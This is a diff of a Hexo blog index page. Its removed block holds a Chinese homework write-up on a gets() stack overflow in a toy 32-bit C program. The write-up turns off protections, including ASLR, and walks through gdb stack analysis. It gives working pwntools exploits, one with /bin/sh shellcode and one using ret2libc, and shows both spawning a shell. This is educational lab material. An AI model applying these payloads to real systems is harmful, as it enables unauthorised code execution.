-<p>gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
-<h3 id="2-关闭相关保护机制"><a href="#2-关闭相关保护机制" class="headerlink" title="2. 关闭相关保护机制"></a>2. 关闭相关保护机制</h3><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序，<code>-g</code>方便gdb调试。</p>
-<ol>
-<li><strong>关闭栈溢出保护</strong> <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 </li>
-<li><strong>关闭 PIE</strong>（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</li>
-<li><strong>关闭ASLR</strong> <code># echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>(需要在root环境下)。Linux 平台下还有地址空间分布随机化（ASLR）的机制,简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有<ul>
-<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
-<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
-<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
-</ul>
-</li>
-<li><strong>关闭DEP</strong> 通过<code>-z execstack</code>关闭数据执行保护。</li>
-</ol>
-<p>编译：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge@ubuntu:~/Desktop/Link to homework2/bufover$ gcc -m32 -g -fno-stack-protector -z execstack stack_over.c -o stack_overstack_over.c: In function ‘vulnerable’:stack_over.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]   gets(s);   ^/tmp/ccMXMZDo.o: In function `vulnerable&apos;:stack_over.c:(.text+0x27): warning: the `gets&apos; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
-<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec stack_over[+] checksec for &apos;/media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over&apos;Canary                        : NoNX                            : NoPIE                           : NoFortify                       : NoRelRO                         : Partial</span><br></pre></td></tr></table></figure>
-<h3 id="3-分析程序溢出点"><a href="#3-分析程序溢出点" class="headerlink" title="3. 分析程序溢出点"></a>3. 分析程序溢出点</h3><p>查看代码段信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d stack_over</span><br><span class="line">0804843b &lt;success&gt;: 804843b:	55                   	push   %ebp 804843c:	89 e5                	mov    %esp,%ebp 804843e:	83 ec 08             	sub    $0x8,%esp 8048441:	83 ec 0c             	sub    $0xc,%esp 8048444:	68 10 85 04 08       	push   $0x8048510 8048449:	e8 c2 fe ff ff       	call   8048310 &lt;puts@plt&gt; 804844e:	83 c4 10             	add    $0x10,%esp 8048451:	90                   	nop 8048452:	c9                   	leave   8048453:	c3                   	ret    08048454 &lt;vulnerable&gt;: 8048454:	55                   	push   %ebp 8048455:	89 e5                	mov    %esp,%ebp 8048457:	83 ec 18             	sub    $0x18,%esp 804845a:	83 ec 0c             	sub    $0xc,%esp 804845d:	8d 45 ec             	lea    -0x14(%ebp),%eax 8048460:	50                   	push   %eax 8048461:	e8 9a fe ff ff       	call   8048300 &lt;gets@plt&gt; 8048466:	83 c4 10             	add    $0x10,%esp 8048469:	90                   	nop 804846a:	c9                   	leave   804846b:	c3                   	ret    0804846c &lt;main&gt;: 804846c:	8d 4c 24 04          	lea    0x4(%esp),%ecx 8048470:	83 e4 f0             	and    $0xfffffff0,%esp 8048473:	ff 71 fc             	pushl  -0x4(%ecx) 8048476:	55                   	push   %ebp 8048477:	89 e5                	mov    %esp,%ebp 8048479:	51                   	push   %ecx 804847a:	83 ec 04             	sub    $0x4,%esp 804847d:	e8 d2 ff ff ff       	call   8048454 &lt;vulnerable&gt; 8048482:	b8 00 00 00 00       	mov    $0x0,%eax 8048487:	83 c4 04             	add    $0x4,%esp 804848a:	59                   	pop    %ecx 804848b:	5d                   	pop    %ebp 804848c:	8d 61 fc             	lea    -0x4(%ecx),%esp 804848f:	c3                   	ret</span><br></pre></td></tr></table></figure>
-<p>可以看到，在0x8048461调用gets函数，开启gdb调试，在gets函数下断点单步调试，观察程序运行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb stack_overGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">gef➤  b *0x8048461Breakpoint 1 at 0x8048461: file stack_over.c, line 6.gef➤  rStarting program: /media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over Breakpoint 1, 0x08048461 in vulnerable () at stack_over.c:66	  gets(s);──────────────────────────────────────────── code:x86:32 ────    0x8048459 &lt;vulnerable+5&gt;   sbb    BYTE PTR [ebx+0x458d0cec], al    0x804845f &lt;vulnerable+11&gt;  in     al, dx    0x8048460 &lt;vulnerable+12&gt;  push   eax →  0x8048461 &lt;vulnerable+13&gt;  call   0x8048300 &lt;gets@plt&gt;   ↳   0x8048300 &lt;gets@plt+0&gt;     jmp    DWORD PTR ds:0x804a00c       0x8048306 &lt;gets@plt+6&gt;     push   0x0       0x804830b &lt;gets@plt+11&gt;    jmp    0x80482f0       0x8048310 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x804a010       0x8048316 &lt;puts@plt+6&gt;     push   0x8       0x804831b &lt;puts@plt+11&gt;    jmp    0x80482f0──────────────────────────────────── arguments (guessed) ────gets@plt (   [sp + 0x0] = 0xffffcf94 → 0x00000003,   [sp + 0x4] = 0xf7fb4000 → 0x001afdb0,   [sp + 0x8] = 0xf7fb2244 → 0xf7e1c020 →  call 0xf7f21289)────────────────────────────────── source:stack_over.c+6 ────      1	 #include &lt;stdio.h&gt;      2	 #include &lt;string.h&gt;      3	 void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;      4	 void vulnerable() &#123;      5	   char s[12];           // s=0xffffcf94  →  0x00000003 →    6	   gets(s);      7	 &#125;      8	 int main(int argc, char **argv) &#123;      9	   vulnerable();     10	   return 0;     11	 &#125;</span><br></pre></td></tr></table></figure>
-<p>程序在<code>call   0x8048300 &lt;gets@plt&gt;</code>停下，<code>ni</code>指令单步执行，输入30个a测试，继续调试到 <code>0x804846b &lt;vulnerable+23&gt;  ret</code>，观察寄存器和栈。</p>
-<p><em>ret 指令相当于 pop eip。即，首先将 esp 指向的 4 字节内容读取并赋值给 eip，然后 esp 加上 4 字节指向栈的下一个位置。</em></p>
-<p>因此esp指向的4字节0xffffcfac的内容“aaaa”（0x61616161）将赋值给eip，<code>[!] Cannot disassemble from $PC</code>.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  niaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa          ─────────────────────────────────────────────────────────────gef➤  ni7	&#125;[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcf90  →  0x00000001$ebp   : 0xffffcfa8  →  &quot;aaaaaaaaaa&quot;$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x08048469  →  &lt;vulnerable+21&gt; nop $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcf90│+0x0000: 0x00000001	 ← $esp0xffffcf94│+0x0004: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcf98│+0x0008: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcf9c│+0x000c: &quot;aaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcfa0│+0x0010: &quot;aaaaaaaaaaaaaaaaaa&quot;0xffffcfa4│+0x0014: &quot;aaaaaaaaaaaaaa&quot;0xffffcfa8│+0x0018: &quot;aaaaaaaaaa&quot;	 ← $ebp0xffffcfac│+0x001c: &quot;aaaaaa&quot;──────────────────────────────────────────── code:x86:32 ────    0x8048460 &lt;vulnerable+12&gt;  push   eax    0x8048461 &lt;vulnerable+13&gt;  call   0x8048300 &lt;gets@plt&gt;    0x8048466 &lt;vulnerable+18&gt;  add    esp, 0x10 →  0x8048469 &lt;vulnerable+21&gt;  nop        0x804846a &lt;vulnerable+22&gt;  leave      0x804846b &lt;vulnerable+23&gt;  ret        0x804846c &lt;main+0&gt;         lea    ecx, [esp+0x4]    0x8048470 &lt;main+4&gt;         and    esp, 0xfffffff0    0x8048473 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">```这里可以看到栈的结构，缓冲区从0xffffcf94开始，ebp 在偏移0x14之后的0xffffcfa8位置，ret 在ebp之后的4个字节0xffffcfac位置。</span><br></pre></td></tr></table></figure>
-<pre><code>                   +-----------------+
-                   |     retaddr     |
-ret, 0xffffcfac---&gt;+-----------------+
-                   |     saved ebp   |
-ebp, 0xffffcfa8---&gt;+-----------------+
-                   |                 |
-                   |                 |
-                   |                 |
-                   |                 |
-                   |                 |
-                   |                 |
-   s, 0xffffcf94--&gt;+-----------------+
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```gef➤  ni────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcfac  →  &quot;aaaaaa&quot;$ebp   : 0x61616161 (&quot;aaaa&quot;?)$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x0804846b  →  &lt;vulnerable+23&gt; ret $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcfac│+0x0000: &quot;aaaaaa&quot;	 ← $esp0xffffcfb0│+0x0004: 0xf7006161 (&quot;aa&quot;?)0xffffcfb4│+0x0008: 0xffffcfd0  →  0x000000010xffffcfb8│+0x000c: 0x000000000xffffcfbc│+0x0010: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x100xffffcfc0│+0x0014: 0xf7fb4000  →  0x001afdb00xffffcfc4│+0x0018: 0xf7fb4000  →  0x001afdb00xffffcfc8│+0x001c: 0x00000000──────────────────────────────────────────── code:x86:32 ────    0x8048462 &lt;vulnerable+14&gt;  call   0x10c4:0x83fffffe    0x8048469 &lt;vulnerable+21&gt;  nop        0x804846a &lt;vulnerable+22&gt;  leave   →  0x804846b &lt;vulnerable+23&gt;  ret    [!] Cannot disassemble from $PC</span><br></pre></td></tr></table></figure>
-<p>继续执行发现<code>[!] Cannot access memory at address 0x61616161</code>0x61616161内存地址不能被访问，程序崩溃。可以看到，执行ret指令之后esp加上4字节指向0xffffcfb0。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ni0x61616161 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcfb0  →  0xf7006161 (&quot;aa&quot;?)$ebp   : 0x61616161 (&quot;aaaa&quot;?)$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x61616161 (&quot;aaaa&quot;?)$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcfb0│+0x0000: 0xf7006161 (&quot;aa&quot;?)	 ← $esp0xffffcfb4│+0x0004: 0xffffcfd0  →  0x000000010xffffcfb8│+0x0008: 0x000000000xffffcfbc│+0x000c: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x100xffffcfc0│+0x0010: 0xf7fb4000  →  0x001afdb00xffffcfc4│+0x0014: 0xf7fb4000  →  0x001afdb00xffffcfc8│+0x0018: 0x000000000xffffcfcc│+0x001c: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x10──────────────────────────────────────────── code:x86:32 ────[!] Cannot disassemble from $PC[!] Cannot access memory at address 0x61616161</span><br></pre></td></tr></table></figure>
-<h3 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4. 构造payload"></a>4. 构造payload</h3><p><strong>分析：</strong>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 shellcode_addr(0xffffcfb0)，并且在0xffffcfb0位置写上shellcode，那么在执行完ret指令之后 就会转到shellcode执行。前面又知道了ret相对偏移位置，因此 可以构造payload <code>&#39;a&#39; * 0x14 + &#39;bbbb&#39; + p32(shell_addr) + shellcode</code>。此时栈的结构是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                         +-----------------+</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |    shellcode    |</span><br><span class="line">shellcode, 0xffffcfb0---&gt;+-----------------+</span><br><span class="line">                         |    0xffffcfb0   |</span><br><span class="line">      ret, 0xffffcfac---&gt;+-----------------+</span><br><span class="line">                         |      bbbb       |</span><br><span class="line">      ebp, 0xffffcfa8---&gt;+-----------------+</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">         s, 0xffffcf94--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
-<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 <code>0xffffcfb0</code> 在内存中的形式是</p>
-<p><code>\xb0\xcf\xff\xff</code></p>
-<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用 pwntools 了 ，这里利用 pwntools 的代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp_shell.py </span><br><span class="line">##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&apos;./stack_over&apos;)shell_addr = 0xffffcfb0shellcode = &apos;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42&apos;## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(shell_addr) + shellcodeprint (p32(shell_addr))## 向程序发送字符串raw_input()sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>shellcode使用的网上现有的，功能是开启一个shell，如下可以看到测试成功。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_shell.py [+] Starting local process &apos;./stack_over&apos;: pid 25993����[*] Switching to interactive mode$ whoamichallenge$ exit[*] Got EOF while reading in interactive$ [*] Process &apos;./stack_over&apos; stopped with exit code 0 (pid 25993)[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
-<h3 id="5-return2libc"><a href="#5-return2libc" class="headerlink" title="5. return2libc"></a>5. return2libc</h3><p>如果开启DEP，发现此攻击并不能成功，因为shellcode是在栈上，是不能执行的。现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
-<p><code>$ gcc -m32 -g -fno-stack-protector stack_over.c -o stack_over1</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec[+] checksec for &apos;/media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over1&apos;Canary                        : NoNX                            : YesPIE                           : NoFortify                       : NoRelRO                         : Partial</span><br></pre></td></tr></table></figure>
-<p>我们知道stack_over调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
-<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b mainBreakpoint 1 at 0x804847d: file stack_over.c, line 9.gef➤  rStarting program: /media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over gef➤  p system$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3e940 &lt;system&gt;</span><br><span class="line">gef➤  p exit$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e327b0 &lt;exit&gt;gef➤  p __libc_start_main$4 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e1c540 &lt;__libc_start_main&gt;gef➤  find 0xf7e1c540, +2200000, &quot;/bin/sh&quot;0xf7f5d02bwarning: Unable to access 16000 bytes of target memory at 0xf7fb6db3, halting search.1 pattern found.gef➤  x/s 0xf7f5d02b0xf7f5d02b:	&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
-<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过<code>p system</code>这个命令来获取system函数在内存中的位置，通过<code>p exit</code>这个命令来获取exit函数在内存中的位置，随后我们可以通过<code>p __libc_start_main</code>这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找<code>&quot;/bin/sh&quot;</code>这个字符串。这样我们就得到了system的地址<code>0xf7e3e940</code>、exit的地址<code>0xf7e327b0</code>以及<code>&quot;/bin/sh&quot;</code>的地址<code>0xf7f5d02b</code>.</p>
-<p><strong>构造payload</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp_shell1.py </span><br><span class="line"></span><br><span class="line">##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&apos;./stack_over1&apos;)system_addr = 0xf7e3e940exit_addr = 0xf7e327b0binsh_addr = 0xf7f5d02b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)## 向程序发送字符串raw_input()sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive()</span><br></pre></td></tr></table></figure>
-<p>测试成功：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_shell1.py [+] Starting local process &apos;./stack_over1&apos;: pid 31640[*] Switching to interactive mode$ whoamichallenge</span><br></pre></td></tr></table></figure>
-<h3 id="实验平台"><a href="#实验平台" class="headerlink" title="实验平台"></a>实验平台</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ uname -aLinux ubuntu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">$ gdb --versionGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">gdb 插件 gef</span><br></pre></td></tr></table></figure>
-
-          
+          栈溢出1. 存在漏洞的函数123456789101112stack_over.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &#123; puts(&quot;You Hava already controlled 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/04/26/2019-4-26-stackoverfolw/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -981,6 +891,16 @@ ebp, 0xffffcfa8---&gt;+-----------------+
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/29/2019-4-26-how2blog/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/29/2019-4-26-how2blog/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1038,12 +958,19 @@ ebp, 0xffffcfa8---&gt;+-----------------+
       
         
           
-            <p><a href="https://hankliu62.github.io/2017/09/09/hexo-github-blog-guide/" target="_blank" rel="noopener">MAC搭建个人博客hexo+github详细完整步骤</a> 这个hexo的命令怎么就不能开机自启呢？每次都要source。。。。</p>
-<p><a href="http://lijiankun24.com/Mac%E4%B8%8BHexo%E5%92%8CGitHub-Pages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A21/" target="_blank" rel="noopener">Mac 下 Hexo 和 GitHub-Pages 搭建个人博客（一）</a>  涉及md插入图片功能</p>
-<p><a href="https://github.com/qiubaiying/qiubaiying.github.io/wiki/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B" target="_blank" rel="noopener">博客搭建详细教程</a> 域名等</p>
-<p><a href="https://github.com/limedroid/HexoLearning" target="_blank" rel="noopener">Hexo 博客搭建指南</a>. 分类等功能</p>
+          MAC搭建个人博客hexo+github详细完整步骤 这个hexo的命令怎么就不能开机自启呢？每次都要source。。。。
+Mac 下 Hexo 和 GitHub-Pages 搭建个人博客（一）  涉及md插入图片功能
+博客搭建详细教程 域名等
+Hexo 博客搭建指南. 分类等功能
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/29/2019-4-26-how2blog/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1135,6 +1062,16 @@ ebp, 0xffffcfa8---&gt;+-----------------+
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/29/hello-world/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/12/29/hello-world/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -1192,17 +1129,15 @@ ebp, 0xffffcfa8---&gt;+-----------------+
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
+          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/29/hello-world/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1303,10 +1238,10 @@ ebp, 0xffffcfa8---&gt;+-----------------+
               
               
               <div class="site-state-item site-state-tags">
-                
+                <a href="/tags/index.html">
                   <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -1314,6 +1249,16 @@ ebp, 0xffffcfa8---&gt;+-----------------+
 
           
 
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="nanjiang1121@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
           
 
           
@@ -1359,7 +1304,7 @@ ebp, 0xffffcfa8---&gt;+-----------------+
 
 
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
 
 
 
@@ -1489,6 +1434,13 @@ ebp, 0xffffcfa8---&gt;+-----------------+
   
   
 
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
   
 
   
@@ -1528,6 +1480,28 @@ ebp, 0xffffcfa8---&gt;+-----------------+
 
 
 
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: true,
+        appId: 'lJhDDwQjkkXqkPD3T4C08FcC-gzGzoHsz',
+        appKey: 'NeB4XcXQ7TKWvap0shkzl7ys',
+        placeholder: '有什么要对challenge说的',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
 
 
 
